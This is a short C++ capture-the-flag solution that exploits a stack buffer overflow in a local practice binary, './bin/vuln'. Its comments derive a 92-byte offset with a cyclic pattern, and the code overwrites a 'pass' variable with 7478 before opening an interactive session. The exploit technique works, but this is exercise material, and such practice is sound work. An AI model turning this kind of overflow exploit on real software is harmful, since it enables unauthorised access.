#include <ctf/ctf.hpp>
#include <exception>
#include <iostream>

using namespace ctf;

// char buf at $rbp-0x60
// pass at $rbp-0x4
// 0x60-0x4 = 92
// Also if we pass a cyclic pattern, we clobber rbp at 0x61616179
// which corresponds to 96th pos cyclic pattern at x/xw $rbp-0x4 =
// 0x61616178

constexpr uint32_t RBP_0x4 = 0x61616178;
constexpr int PASS         = 7478;

int main() try {
    auto payload = from_ranges<uint8_t>(
        cyclic(cyclic_find(RBP_0x4)), 
        p<uint64_t>(PASS)
    );
    auto proc = Process("./bin/vuln");
    proc.writeln(payload);
    proc.interactive();
} catch (const std::exception &ec) {
    std::cerr << ec.what() << std::endl;
}